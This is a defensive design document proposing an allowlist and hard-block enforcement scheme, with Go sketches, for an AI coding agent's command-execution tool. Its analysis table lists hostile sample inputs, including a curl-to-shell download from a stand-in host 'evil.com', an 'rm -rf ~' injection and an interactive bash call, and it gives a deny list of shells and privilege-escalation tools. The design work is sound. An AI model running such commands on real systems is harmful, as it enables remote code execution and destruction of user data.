# `exec_command` — Strict Enforcement Design (for review)

## The model in one sentence

`exec_command` = **run ONE named program, with no shell, from an explicit allowlist.**
If it isn't a bare, allowlisted program name → denied. There is no shell, so there
are no operators to escape through.

`run_terminal_command` stays the *opt-in* shell tool (accepted risk, off by default).

---

## Why this is enough (evidence from `shlex`)

`exec_command` uses `shlex.Split` + `exec.Command(argv[0], argv[1:]...)` — **no shell is
invoked.** The probe confirmed that without a shell, operators and expansions are inert:

| input | `shlex` result | consequence with no shell |
|---|---|---|
| `git; curl evil.com/x \| sh` | `["git;" "curl" "evil.com/x" "\|" "sh"]` | `git;` is not a real binary → denied; no `sh` is ever spawned |
| `git && rm -rf ~` | `["git" "&&" "rm" "-rf" "~"]` | `&&` is a literal arg, not an operator → `git` gets a junk arg, harmless |
| `go $HOME/x` | `["go" "$HOME/x"]` | `$HOME` stays literal (no expansion) → `go` fails to find the file |
| `git *` | `["git" "*"]` | `*` stays literal (no glob) → harmless |
| `/bin/bash -i` | `["/bin/bash" "-i"]` | program path rejected (see check 1) |
| `python3 /tmp/pwn.py` | `["python3" "/tmp/pwn.py"]` | **allowed** — this is how the agent runs scripts (see policy below) |

**Key consequence:** the *only* way to reintroduce a shell is to make a shell (or an
interpreter/indirection tool) the **program** (`argv[0]`). So the entire control reduces
to: *constrain `argv[0]` to an explicit allowlist of bare names, and hard-block shells.*
Everything else (operators, `$var`, `*`) is dead weight without a shell.

> Note: I deliberately do **not** reject a `|`/`;` that appears *inside a quoted argument*
> (e.g. `git commit -m "a|b"`), because with no shell it is a harmless literal. Blocking
> it would break legitimate args for zero security gain.

---

## The enforcement checks (in order)

`argv[0]` is validated by this chain; the first failure denies the call.

1. **Parse.** `shlex.Split(command)`. Empty result or parse error → deny.
2. **No program path.** If `argv[0]` contains `/` or `\` → deny.
   Blocks `/bin/bash`, `./script`, `C:\...`, `../x`. Program must be a **bare name**.
3. **Must resolve.** `exec.LookPath(argv[0])` must succeed. Unknown binary → deny.
   (Also kills bare operator tokens like `;`, `|`, `&&` — they aren't in `PATH`.)
4. **Hard-block (deny-by-default, unoverridable).** If `filepath.Base(resolved)` is in
   `hardBlockArg0` → deny, *even if the allowlist would include it*. This is the belt
   that guarantees shells/indirection can never be the program, no matter how the
   allowlist is edited.
5. **Allowlist (deny-by-default).** `filepath.Base(resolved)` must be in
   `allowedPrograms`. Anything not explicitly listed → deny. **This is the policy knob.**
6. **Args path-checked.** Each token that looks like a path passes the existing
   `checkPath` (relative-to-cwd / `/tmp`), preserving "don't reach outside the sandbox."
7. **`working_dir` path-checked** (existing behavior) and used as `cmd.Dir`.
8. **Run with context + timeout.** `exec.CommandContext(ctx, resolvedAbs, args...)`
   with a deadline (e.g. 120 s, configurable) so a hung command can't block forever.
   Run the **resolved absolute path** (from check 3), not the bare name, so we execute
   exactly the binary we validated.

---

## The two lists (the actual policy)

### `hardBlockArg0` — never allowed as the program (defense-in-depth)

```go
var hardBlockArg0 = map[string]bool{
    // POSIX shells
    "sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true,
    "fish": true, "csh": true, "tcsh": true,
    // Windows shells / interop
    "cmd": true, "powershell": true, "pwsh": true, "wsl": true,
    // Indirection — can spawn arbitrary programs
    "env": true, "xargs": true, "find": true, "nohup": true,
    "nice": true, "stdbuf": true,
    // Privilege escalation
    "sudo": true, "su": true, "doas": true, "pkexec": true,
}
```

> `find` is dropped from the runnable set (it has `-exec`/`-execdir`). The agent has the
> dedicated `file_glob_search` tool for searching, so this is not a real capability loss.
> **Decision point:** confirm you're OK removing `find` from `exec_command`.

### `allowedPrograms` — the allowlist (deny by default)

Seed it from the same tool families already in `init()`, but as an **explicit auditable
map** (one source of truth for `exec_command`, independent of the regex string):

```go
var allowedPrograms = map[string]bool{
    // language toolchains
    "go": true, "gofmt": true, "vet": true, "govet": true,
    "cargo": true, "rustc": true, "rustfmt": true,
    // interpreters — REQUIRED so the agent can run generated scripts
    "python3": true, "node": true, "php": true, "ruby": true, "perl": true,
    // build / test / vcs / query
    "git": true, "make": true, "cmake": true, "ninja": true,
    "jq": true, "yq": true, "grep": true, "curl": true, "wget": true,
    // ... (mirror the init() list, as base names)
}
```

**Decision point (the one real choice you have to make):**

- **Tier A — strictest:** allowlist = build/VCS/query tools only, **no general
  interpreters**. Agent must use the opt-in `run_terminal_command` to run `python`/`node`.
- **Tier B — recommended (matches your "let it run scripts" stance):** allowlist **includes
  the interpreters** (`python3`, `node`, `ruby`, `perl`, …) but **excludes the shells**
  (`sh`/`bash`/`cmd`). Running a script = `exec_command("python3 /tmp/x.py")` — allowed
  because `python3` is listable and `/tmp` passes the path check. The *shell-operator
  bypass and arbitrary-binary-by-path holes are gone*; the agent can still run code, just
  through a named program, never through `sh -c`.

I recommend **Tier B**: it removes the actual vulnerabilities (operator escape, any-binary,
absolute-path) while preserving the "run a script" capability you don't want to lose.

---

## Residual risk you should consciously accept (Tier B)

Some *allowlisted* programs are themselves code-execution vehicles. This is inherent to a
coding agent and consistent with your "we won't scan/block every generated script" rule:

- `go run x.go` / `go build` → compiles & runs arbitrary Go.
- `cargo run` / `cargo test` → builds & runs the binary.
- `git` → runs `.git/hooks/*` (and `core.hooksPath`).
- `make` / `cmake` → run build recipes.

These are **intended** capabilities (the agent is a coder). The strictness we're adding
guarantees the *mechanism* is safe (no accidental shell, no unlisted binary, no path
traversal) — it does not and should not try to stop a *listed* tool from doing its job.
If you later want to claw back even this, the knob is simply removing that entry from
`allowedPrograms`.

---

## Proposed implementation sketch

```go
// hardBlockArg0 / allowedPrograms defined above.

func (t *BaseToolManager) validateProgram(command string) (abs string, args []string, err error) {
    tok, e := shlex.Split(command)
    if e != nil {
        return "", nil, fmt.Errorf("failed to parse command: %w", e)
    }
    if len(tok) == 0 {
        return "", nil, fmt.Errorf("empty command")
    }
    prog := tok[0]

    // 2) bare name only — no absolute/relative program paths
    if strings.ContainsAny(prog, `/\`) {
        return "", nil, fmt.Errorf("program %q must be a bare command name (no path)", prog)
    }
    // 3) must be a real PATH binary
    abs, e = exec.LookPath(prog)
    if e != nil {
        return "", nil, fmt.Errorf("command %q not found in PATH: %w", prog, e)
    }
    base := filepath.Base(abs)
    // 4) hard-block shells / indirection, unconditionally
    if hardBlockArg0[base] {
        return "", nil, fmt.Errorf("command %q is not permitted via exec_command", base)
    }
    // 5) allowlist, deny by default
    if !allowedPrograms[base] {
        return "", nil, fmt.Errorf("command %q is not in the exec_command allowlist", base)
    }
    return abs, tok[1:], nil
}

func (t *BaseToolManager) execCommandStrict(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
    command := argString(request, "command")
    abs, args, err := t.validateProgram(command)
    if err != nil {
        return mcp.NewToolResultText("[ERROR]"), err
    }

    // 6) path-check any arg that looks like a path
    for _, a := range args {
        if res, perr := t.checkPath(strings.TrimSpace(a)); perr != nil {
            return res, perr
        }
    }

    // 7) working_dir (existing behavior)
    wd := "./"
    if v := argString(request, "working_dir"); v != "" {
        wd = v
    }
    if res, perr := t.checkPath(wd); perr != nil {
        return res, perr
    }

    // 8) context + timeout
    ctx, cancel := context.WithTimeout(ctx, 120*time.Second)
    defer cancel()
    cmd := exec.CommandContext(ctx, abs, args...)
    cmd.Dir = filepath.Clean(wd)
    // ... capture stdout/stderr exactly as today ...
}
```

Integration:
- Register `exec_command` → `execCommandStrict` (replace current handler).
- **Default tool set = `exec_command` only.** `run_terminal_command` moves behind an
  opt-in flag (e.g. `-tools terminal`) so it is *not* exposed by default.

---

## What changes vs. today (summary)

| Today | After |
|---|---|
| `execCommand` applies **no** command whitelist | argv[0] allowlist, deny-by-default |
| Any binary on `PATH` runnable by name | Only allowlisted base names |
| `/bin/bash`, `./x` runnable (abs/rel path) | Program path rejected |
| Shell/interpreter as argv[0] possible | Hard-blocked unconditionally |
| `exec.Command` (no timeout) | `CommandContext` + deadline |
| `run_terminal_command` on by default | Off by default (opt-in) |

**No capability lost for the intended workflow:** the agent can still build, test, query,
VCS, and run generated scripts (`python3 script.py`) — it just can't get a shell for free.
